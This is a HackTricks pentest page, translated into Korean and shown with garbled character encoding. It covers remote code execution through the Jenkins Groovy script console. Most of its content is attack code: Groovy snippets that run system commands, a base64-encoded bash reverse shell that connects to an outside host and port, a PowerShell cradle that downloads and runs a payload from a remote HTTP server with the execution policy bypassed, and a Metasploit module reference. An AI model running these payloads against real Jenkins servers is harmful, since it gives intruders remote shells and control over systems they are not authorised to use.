# Jenkins Groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•œ RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## Jenkins Groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•œ RCE

ì´ëŠ” Jenkinsì—ì„œ ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒë³´ë‹¤ ëœ ì‹œë„ëŸ¬ìš´ ë°©ë²•ì…ë‹ˆë‹¤.

1. _path\_jenkins/script_ë¡œ ì´ë™í•©ë‹ˆë‹¤.
2. í…ìŠ¤íŠ¸ ìƒì ì•ˆì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
ë‹¹ì‹ ì€ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `cmd.exe /c dir`

**ë¦¬ëˆ…ìŠ¤**ì—ì„œëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: **`"ls /".execute().text`**

í…ìŠ¤íŠ¸ ë‚´ë¶€ì— _ë”°ì˜´í‘œ_ì™€ _ì‘ì€ ë”°ì˜´í‘œ_ë¥¼ ì‚¬ìš©í•´ì•¼ í•˜ëŠ” ê²½ìš°, í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ _"""PAYLOAD"""_ (ì„¸ ê°œì˜ í° ë”°ì˜´í‘œ)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë‹¤ë¥¸ ìœ ìš©í•œ ê·¸ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸**ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤ (ëŒ€ê´„í˜¸ ì•ˆì— ëª…ë ¹ì–´ë¥¼ ì‚½ì…í•˜ì„¸ìš”):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### ë¦¬ëˆ…ìŠ¤ì—ì„œì˜ ë¦¬ë²„ìŠ¤ ì‰˜

ë¦¬ë²„ìŠ¤ ì‰˜ì€ ì›ê²© ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì‚¬ìš©í•˜ë©´ ê³µê²©ìëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì— ì‰˜ì„ ì—´ì–´ ì›ê²©ìœ¼ë¡œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” í¸ë¦¬í•˜ê²Œë„ ë°©í™”ë²½ì´ë‚˜ NAT(Network Address Translation) ì¥ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ë°©ë²•ì…ë‹ˆë‹¤.

ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì„¤ì •í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒ ë‹¨ê³„ë¥¼ ë”°ë¼ì•¼ í•©ë‹ˆë‹¤:

1. ê³µê²©ìëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì— ì•…ì„± ì½”ë“œë¥¼ ë°°í¬í•©ë‹ˆë‹¤. ì´ ì½”ë“œëŠ” ê³µê²©ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì„œë²„ì— ì—°ê²°í•˜ê³ , ëª…ë ¹ì„ ì „ë‹¬ë°›ì„ ìˆ˜ ìˆëŠ” ì‰˜ì„ ì—½ë‹ˆë‹¤.
2. ëŒ€ìƒ ì‹œìŠ¤í…œì€ ì•…ì„± ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê³ , ê³µê²©ìì˜ ì„œë²„ì— ì—°ê²°í•©ë‹ˆë‹¤.
3. ê³µê²©ìëŠ” ëŒ€ìƒ ì‹œìŠ¤í…œì— ëª…ë ¹ì„ ì „ë‹¬í•˜ê³ , ê²°ê³¼ë¥¼ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¦¬ë²„ìŠ¤ ì‰˜ì€ í•´ì»¤ë“¤ì´ ì‹œìŠ¤í…œì„ ì¹¨íˆ¬í•˜ê³  ì œì–´í•˜ê¸° ìœ„í•´ ìì£¼ ì‚¬ìš©ë˜ëŠ” ê¸°ìˆ  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‹œìŠ¤í…œ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ì„œëŠ” ì´ëŸ¬í•œ ê³µê²©ì„ ì˜ˆë°©í•˜ê³  íƒì§€í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### ìœˆë„ìš°ì—ì„œì˜ ì—­ì‰˜

PS ì—­ì‰˜ì„ ê°€ì§„ HTTP ì„œë²„ë¥¼ ì¤€ë¹„í•˜ê³  Jekingì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### ìŠ¤í¬ë¦½íŠ¸

[**ì´ ìŠ¤í¬ë¦½íŠ¸**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ì´ í”„ë¡œì„¸ìŠ¤ë¥¼ ìë™í™” í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

MSFë¥¼ ì‚¬ìš©í•˜ì—¬ ì—­ì‰˜ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
